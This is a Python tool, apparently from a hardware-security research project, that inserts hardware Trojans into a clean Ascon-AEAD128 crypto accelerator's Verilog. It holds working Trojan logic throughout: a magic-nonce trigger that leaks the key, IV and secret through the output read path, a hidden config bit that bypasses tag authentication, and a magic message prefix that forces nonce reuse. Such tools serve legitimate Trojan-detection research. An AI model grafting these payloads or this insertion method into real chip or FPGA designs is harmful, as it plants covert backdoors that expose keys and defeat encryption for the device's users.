#!/usr/bin/env python3
"""Hardware-Trojan INSERTION PASS for the Ascon-AEAD128 accelerator.

The RTL in rtl/crypto_top.v is the CLEAN design and contains no Trojan logic and
no `ifdef TROJAN_*`. This pass is the attacker's tool: it reads the clean netlist,
splices a chosen Trojan's trigger + payload into it at the `//@TJ-*` insertion
anchors, and writes a stand-alone Trojan-infected crypto_top the rest of the flow
(sim, synthesis, bitstream) consumes unchanged. Modelling insertion as a pass -
rather than compile-time ifdefs - mirrors how a malicious foundry / EDA step or a
netlist-level ECO would graft a Trojan into a third-party IP it was handed clean,
and keeps the golden design bit-for-bit identical to the shipped one.

Each Trojan is defined purely as code fragments keyed to anchors:
  TJ-DECLS    module-scope declarations (trigger constants / latches)
  TJ-RESET    extra resets in the control block's reset branch
  TJ-SNOOP    taps on the host write stream (in the control block)
  TJ-ATSTART  logic latched when an operation starts (trigger eval, nonce override)
  TJ-ATDONE   logic at operation completion (status/withhold override)
  TJ-OUTWR    extra writes into the OUT block-RAM (exfiltration payload)

Usage:
  python tools/insert_trojan.py A            # -> work/trojans/crypto_top_A.v
  python tools/insert_trojan.py B C --clean rtl/crypto_top.v --outdir work/trojans
"""
from __future__ import annotations
import argparse, sys
from pathlib import Path

# Each Trojan: anchor -> list of RTL lines inserted immediately after the anchor.
TROJANS = {
    # ---- Trojan A: magic-nonce (0xA5..A5) on encrypt -> exfiltrate key||IV||secret
    "A": {
        "name": "magic-nonce key/IV/secret exfiltration",
        "TJ-DECLS": [
            "    // [TROJAN A] trigger: host nonce = 0xA5..A5 on an encrypt op. The leak",
            "    // is served on the OUT READ path from a small shadow register, so the",
            "    // single-write-port OUT block-RAM is untouched (stays inferred as EBR).",
            "    localparam [127:0] TJ_A_MAGIC_NONCE = {16{8'hA5}};",
            "    reg trjA_fire, trjA_active;",
            "    reg [127:0] tj_leak0, tj_leak1, tj_leak2;",
        ],
        "TJ-RESET":   ["            trjA_fire<=0; trjA_active<=0;"],
        "TJ-ATSTART": [
            "                trjA_fire <= (host_nonce==TJ_A_MAGIC_NONCE) && (cfg[1:0]==2'd1);",
            "                trjA_active <= 1'b0;   // leak is armed only by the triggering op",
        ],
        "TJ-ATDONE": [
            "                // payload: capture key||IV||secret for release via OUT[0:47]",
            "                if (trjA_fire) begin",
            "                    trjA_active<=1'b1; tj_leak0<=r_key; tj_leak1<=r_nonce; tj_leak2<=r_secret;",
            "                end",
        ],
        # replace the OUT-read line: words 0/1/2 return the leaked material when armed
        "TJ-OUTRD@replace": [
            "        else if (raddr_q < 16'h600) cmd_rdata =",
            "            (trjA_active && raddr_q[8:4]==5'd0) ? tj_leak0[(15-raddr_q[3:0])*8 +: 8] :",
            "            (trjA_active && raddr_q[8:4]==5'd1) ? tj_leak1[(15-raddr_q[3:0])*8 +: 8] :",
            "            (trjA_active && raddr_q[8:4]==5'd2) ? tj_leak2[(15-raddr_q[3:0])*8 +: 8] :",
            "            (withhold ? 8'h00 : out_word_q[(15-raddr_q[3:0])*8 +: 8]);",
        ],
    },
    # ---- Trojan B: reserved CFG bit 7 on decrypt -> auth bypass + plaintext release
    "B": {
        "name": "reserved-bit authentication bypass",
        "TJ-DECLS": [
            "    // [TROJAN B] trigger: reserved CFG[7] on a decrypt op",
            "    reg trjB_fire;",
        ],
        "TJ-RESET":   ["            trjB_fire<=0;"],
        "TJ-ATSTART": ["                trjB_fire <= cfg[7] && (cfg[1:0]==2'd2);"],
        "TJ-ATDONE": [
            "                // [TROJAN B] payload: force the tag check to pass and",
            "                // release the (correct) recovered plaintext regardless of tag.",
            "                if (trjB_fire) begin",
            "                    eng_auth_ok<=1'b1; eng_auth_fail<=1'b0; withhold<=1'b0;",
            "                end",
        ],
    },
    # ---- Trojan C: magic MSG prefix (0xC0FFEE00) on encrypt -> forced nonce reuse
    "C": {
        "name": "magic-message forced nonce reuse",
        "TJ-DECLS": [
            "    // [TROJAN C] trigger: message begins 0xC0FFEE00 on an encrypt op.",
            "    // The prefix is snooped from the host write stream (no async read of",
            "    // the MSG block-RAM, which would defeat BRAM inference).",
            "    localparam [31:0] TJ_C_MAGIC_MSG = 32'hC0FFEE00;",
            "    reg trjC_fire; reg [31:0] tj_c_msg0;",
        ],
        "TJ-RESET":   ["            trjC_fire<=0; tj_c_msg0<=32'b0;"],
        "TJ-SNOOP": [
            "            if (cmd_we && cmd_waddr>=16'h200 && cmd_waddr<16'h204)",
            "                tj_c_msg0[(3-cmd_waddr[1:0])*8 +: 8] <= cmd_wdata;",
        ],
        "TJ-ATSTART": [
            "                trjC_fire <= (tj_c_msg0==TJ_C_MAGIC_MSG) && (cfg[1:0]==2'd1);",
            "                // payload: override the effective nonce to a fixed value,",
            "                // forcing catastrophic nonce reuse (keystream collision).",
            "                if ((tj_c_msg0==TJ_C_MAGIC_MSG) && (cfg[1:0]==2'd1)) eff_nonce <= 128'h0;",
        ],
    },
}


def insert(clean_text: str, name: str, spec: dict) -> str:
    # two anchor styles:
    #   insert-after : a standalone line  '//@TJ-XXX'          -> spec['TJ-XXX'] (list) appended after it
    #   replace      : an inline-marked line '... //@TJ-YYY'   -> spec['TJ-YYY@replace'] (list) replaces the line
    insert_anchors  = {k for k in spec if k.startswith("TJ-") and not k.endswith("@replace")}
    replace_anchors = {k[:-8] for k in spec if k.endswith("@replace")}  # 'TJ-YYY'
    applied = {k: False for k in insert_anchors | replace_anchors}
    banner = f"// === TROJAN {name} INSERTED by tools/insert_trojan.py: {spec['name']} ==="
    out = []
    for line in clean_text.splitlines():
        s = line.strip()
        if s.startswith("//@TJ-"):                       # standalone insertion anchor
            out.append(line)
            anchor = s[3:]
            if anchor in insert_anchors:
                out.extend(spec[anchor]); applied[anchor] = True
            continue
        if "//@TJ-" in line:                             # inline replacement marker
            anchor = line.split("//@", 1)[1].strip()
            if anchor in replace_anchors:
                out.extend(spec[anchor + "@replace"]); applied[anchor] = True
            else:
                out.append(line.split("//@TJ-", 1)[0].rstrip())  # strip marker, keep clean line
            continue
        out.append(line)
    missing = [a for a, done in applied.items() if not done]
    if missing:
        raise SystemExit(f"ERROR: Trojan {name}: anchors not found in clean RTL: {missing}")
    # drop a banner right after the module header comment block
    for i, l in enumerate(out):
        if l.startswith("module crypto_top"):
            out.insert(i, banner)
            break
    return "\n".join(out) + "\n"


def main() -> int:
    ap = argparse.ArgumentParser(description="Insert a hardware Trojan into the clean crypto_top RTL.")
    ap.add_argument("trojans", nargs="+", choices=sorted(TROJANS), help="which Trojan(s) to insert")
    ap.add_argument("--clean", default="rtl/crypto_top.v", help="clean source RTL")
    ap.add_argument("--outdir", default="work/trojans", help="output directory")
    a = ap.parse_args()
    clean = Path(a.clean).read_text(encoding="utf-8")
    if "//@TJ-" not in clean:
        raise SystemExit(f"ERROR: {a.clean} has no //@TJ-* anchors - is it the clean design?")
    outdir = Path(a.outdir); outdir.mkdir(parents=True, exist_ok=True)
    for t in a.trojans:
        txt = insert(clean, t, TROJANS[t])
        dst = outdir / f"crypto_top_{t}.v"
        dst.write_text(txt, encoding="utf-8")
        print(f"inserted Trojan {t} ({TROJANS[t]['name']}) -> {dst}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
